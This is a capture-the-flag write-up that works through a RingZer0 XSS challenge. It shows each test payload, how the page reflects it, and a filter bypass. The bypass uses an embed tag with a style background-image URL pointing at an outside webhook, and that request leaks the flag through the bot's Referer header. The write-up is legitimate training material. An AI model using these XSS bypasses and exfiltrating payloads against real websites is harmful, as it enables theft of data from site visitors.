# XSS Challenge 4 Solutions

The first payload I tried with was
```
abcd"<'
```
and viewing the page source for the response is the following:
```html
<!DOCTYPE html>
<html>
	<head>
		<title>RingZer0 Team Online CTF Challenge</title>
		<link rel="stylesheet"  type="text/css" href="/css/main.css">
	</head>
	<body>
		<header></header>
		<div class="padding"><img src="/imgs/logo.png" /></div>
		<section>
			<br />
      <br />
      Your opinion matters to us again! Write some feedback.<br /><br />
      <form action="" method="post">
        Comment<br />
        <textarea name="comment"></textarea><br />
        <input type="submit" value="submit" />
      </form>
		  <br />abcd\"<\'<br /><br />		</section>
      <div class="pre_footer"></div>
    <footer>RingZer0 Team 2022</footer>
	</body>
</html>
```

Essentially, this is how my payload was reflected in the document:
```html	
<br />abcd\"<\'<br /><br />		</section>	
```
Looks like the double and single quotes were escaped but the `<` was not.
So the next payload I tried with was:
```html
<img src=x onerror=alert(1)>
```
this payload was reflected onto the page like:
```html
<br /> =x deletederror=alert(1)><br /><br />		</section>
```
This was slightly weird as the whole of `<img src` was sanitized out and the `deletederror` attribute was also weird. I had a guess that it was trying to sanitize the `src` attribute out. So I tested the theory with the following payloads:

1.
```html
<img src=x>
```
which was reflected like:
```html
=x>
```
2.
```html
< img src=x>
```
which was reflected like:
```html
<br />< img =x><br /><br />		</section>
```
3. 
```
<embed src=x>
```
which was reflect like:
```html
<br /><embed =x><br /><br />		</section>
```
So other than the first payload which had a weird output, it looked like it's sanitizing the `src` attribute out. 
As a result, I thought to use a similar trick from a previous challenge which meant utilizing `style` attribute instead.

I used the following payload:
```html
<embed style=background-image:url(http://mywebhooklistener.com)>
```
and received the following request from the XSS Bot:
```
GET / HTTP/1.1
Referer: http://127.0.0.1/xss4/bot_endpoint_8z5yTf83br.php?FLAG-[CENSORED]
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: mywebhooklistener.com
```
The flag is in the bag! :) 